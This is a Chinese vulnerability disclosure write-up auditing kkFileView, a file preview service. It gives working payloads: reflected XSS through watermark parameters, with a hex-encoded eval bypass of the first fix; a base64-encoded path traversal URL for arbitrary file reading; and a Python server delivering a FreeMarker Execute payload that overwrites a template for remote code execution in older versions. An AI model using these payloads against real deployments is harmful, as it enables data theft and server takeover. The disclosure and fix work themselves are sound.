在线文档预览代码审计
==========

以下漏洞均已报告给官方，官方在最新版本(***2022年12月28日*** )进行了修复，仓库地址：

```php
https://github.com/kekingcn/kkFileView
https://gitee.com/kekingcn/file-online-preview
```

本文仅用于技术讨论与研究，文中的实现方法切勿应用在任何违法场景。如因涉嫌违法造成的一切不良影响，本文作者概不负责。

XSS 注入漏洞
========

XSS 注入漏洞不只这一个，因为没什么可说的所以这里只写一个出来

分析
--

在 ***AttributeSetFilter*** 中，多个参数未进行 ***XSS*** 过滤

*cn.keking.web.filter.AttributeSetFilter#setWatermarkAttribute*

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-bd896e8cdb0937f16811de6cd2b3bdd504f13dac.png)

参数在 ***commonHeader*** 中被使用

*src/main/resources/web/commonHeader.ftl*

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-255648a574317120dc884e3af79bd9db2a277ed4.png)

改模板被多个模板文件引用，其中存在 ***picture.ftl***

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-364f9220982e258a6ddee30d41fdfca45eda6f95.png)

该模板在 ***/picturesPreview*** 中使用

*cn.keking.web.controller.OnlinePreviewController#picturesPreview*

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-b35aaa61d2396cabe99d8325244ab7dd64a23ccb.png)

漏洞复现
----

```php
/picturesPreview
?urls=aHR0cDovLzE=
&watermarkXSpace=1});}}alert(1);function a(){function b(){return ({//
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-9b34913ea1c7221c51dc9078242ca1fd1918cb6c.png)

官方修复小插曲
-------

### 修复方案

在我报告了漏洞，官方很快提供了修复方案，但这个修复方案我一看就不对劲。

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-a61889be3bf41b53f3ad280552c05e85605c9367.png)

既然你不让我用 ***{ }*** 那就不用

这里其实我们就在 ***js*** 的代码中，所以不需要引号（***"，‘***）进行逃逸。但是不代表不需要引号了，最基本的 ***alert*** 一定要让他弹出来

所以我想到了 ***eval()***，那么引号的代替品 ***`*** (es6 语法新出的) 很幸运的没有被过滤，最后再将要执行的代码进行 ***16进制*** 编码就可以了

```javascript
// eval(`alert('xss')`)
eval(`\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29`)
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-df25faf3f57acfafab5801aefc6414b8dea8722c.png)

### 提出修复建议

前面说了，我们直接再 ***js*** 代码中了，所以不需要引号（***"，‘***）逃逸，那么我给出的修复方案是在参数的周围用引号去包裹要输出的值，这样他就无法逃逸出来了

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-f4ac7f0ae1ef6e7040470dc6b40febd44d687d22.png)

如果需要他必须是 ***number*** 数字型的参数可以加上 ***parseInt/Float()*** 强转成证书

```javascript
parseInt("${watermarkXSpace}")
```

### 再次修复

可惜官方并没有采用这种修复方案，而已在 ***Java*** 端进行限制，限制参数必须为数值，如果不是数值则不输出内容请求参数中的。

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-28d8caa2ccd6d487a21b6f5f7287d0d325e729e0.png)

任意文件读取漏洞
========

分析
--

未授权接口 ***/onlinePreview*** 接收 ***base64 encode*** 编码的参数： ***url***，解析 ***url*** 后获取视图处理器，并调用 ***filePreviewHandle*** 处理视图

*cn.keking.web.controller.OnlinePreviewController#onlinePreview*

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-406097ea381d5cecd157dff343df650a18eae641.png)

解析 ***url*** 参数中的 ***fullfilename*** 作为文件名，这里的文件名其实也存在 ***xss*** 注入漏洞。

*cn.keking.service.FileHandlerService#getFileAttribute*

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-431780d6c8115b6399e50d4f61ddd2a545384af0.png)

其中 ***CodeFilePreviewImpl***、***XmlFilePreviewImpl***、***MarkdownFilePreviewImpl*** 调用了 ***SimTextFilePreviewImpl*** 进行处理

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-55bb36aa0b59e85889a289a4988767230d61c4eb.png)

在 ***SimTextFilePreviewImpl#filePreviewHandle*** 中会通过 ***textData*** 读取文件内容，并设置到全局参数中，主力第二处红框的 ***getContent***

*cn.keking.service.impl.SimTextFilePreviewImpl#filePreviewHandle*

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-f42b4faa1cc9931e255d411e013062ecb875ccb5.png)

方法 ***DownloadUtils#downLoad*** 文件会调用 ***getRelFilePath*** 方法

*cn.keking.utils.DownloadUtils#downLoad*

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-2c4ccd0d79efc2c76475059595c473e42cd59b56.png)

如果文件存在则会直接跳过下载

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-a73f21431ab348bf4b93e415cca91b3347726eba.png)

最后文件名的参数会被传入 ***textData*** 中读取文件内容

*cn.keking.service.impl.SimTextFilePreviewImpl#textData*

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-2df79ea9c1ae4c84dc89a3384b396b739a84567d.png)

其他的文件类型，因为可以直接以原本的格式显示在页面上，所以效果是同样的一样可以达到任意文件读取，如视频文件则会直接将视频响应至页面中播放，pdf... 等都是一样的

漏洞复现
----

```json
//  /onlinePreview?url=http:/1/?fullfilename=../../../../pom.xml
GET /onlinePreview?url=aHR0cDovMSEvP2Z1bGxmaWxlbmFtZT0uLi8uLi8uLi8uLi9wb20ueG1s 
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-0472e7d2b780e2895732269725450776569506c7.png)

文件写入漏洞？
=======

细心的师傅可能注意到了文件读取漏洞种我提了 “如果文件存在则会直接跳过下载”，那么这里的下载是指？

新版分析
----

回到 ***SimTextFilePreviewImpl#filePreviewHandle*** 处理种，如果我们读的文件不在缓存种，则会去 ***downLoad*** 文件

*cn.keking.service.impl.SimTextFilePreviewImpl#filePreviewHandle*

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-6df95d0f117ca5ae9bbc4bf1e8918e42533257a5.png)

这里如果 ***本地不存*** 在该文件，则会通过参数的 ***url*** 发起请求下载文件，但是这里有一个前提 ***本地不存在*** 该文件才会触发下载，所以没法构成 ***任意文件写入漏洞***，但是旧版有没有呢？

*cn.keking.utils.DownloadUtils#downLoad*

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-6764238972294c59a3e067707ce0aaf3a3dd7ff1.png)

旧版分析
----

跳过下载的功能是 ***2021年12月17日*** 添加的

```php
https://gitee.com/kekingcn/file-online-preview/commit/20f328906caf9b6a840746150bd0d7cdb1a7187c
```

那么就在这里找上一次提交的代码进行下载

*<https://gitee.com/kekingcn/file-online-preview/tree/4d1e2eb9c633c95b28ee670ccc74d6a69a41a2a9>*

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-f7f569b1fdce21746d681d341f8f325be7a4782f.png)

可以看到是没有跳过下载的逻辑的。

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-35f2a973fbf01f58f421ed94d5c3e6743fc3a7f8.png)

复现
--

用 ***Python*** 实现一个简单的服务器

```java
from http.server import HTTPServer, BaseHTTPRequestHandler

host = ('0.0.0.0', 8888)

class CustomizeHttpServer(BaseHTTPRequestHandler):

    def do_POST(self):
        self.do_GET()

    def do_GET(self):
        self.wfile.write(b'<#assign value="freemarker.template.utility.Execute"?new()>${value("calc.exe")}')

if __name__ == '__main__':
    server = HTTPServer(host, CustomizeHttpServer)
    print("Starting server, listen at: %s:%s" % host)
    server.serve_forever()
```

发起攻击

```php
/onlinePreview?url=aHR0cDovLzEyNy4wLjAuMTo4ODg4P2Z1bGxmaWxlbmFtZT1hLnhtbA==
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-ed7d88b0300a6ae59c4fff1a1758207d7295fc8d.png)

可以看到文件被下载了

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-e20f395cfc057bd00193704fb29e581476b0307a.png)

覆盖模板文件RCE (假想)
--------------

如果使用 ***war*** 的方式部署或者像我一样直接跑起来的项目，可以通过覆盖掉模板文件进行 ***RCE***。

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-a538fd0e6b4283eb382322b534f985a2ff271389.png)

修改服务器代码，返回恶意代码，记得重启服务器。

```python
self.wfile.write(b'<#assign value="freemarker.template.utility.Execute"?new()>${value("calc")}')
```

利用目录穿越覆盖掉文件

```php
/onlinePreview?url=aHR0cDovLzEyNy4wLjAuMTo4ODg4P2Z1bGxmaWxlbmFtZT0uLi8uLi8uLi90YXJnZXQvY2xhc3Nlcy93ZWIvaW5kZXguZnRs
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-a94ec7c7ce3d2e4a27ef29b4817947ab27fb7cf3.png)

再次访问地址，造成RCE

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-2232a612fd7e7b310c048e9495b6b85938c7b889.png)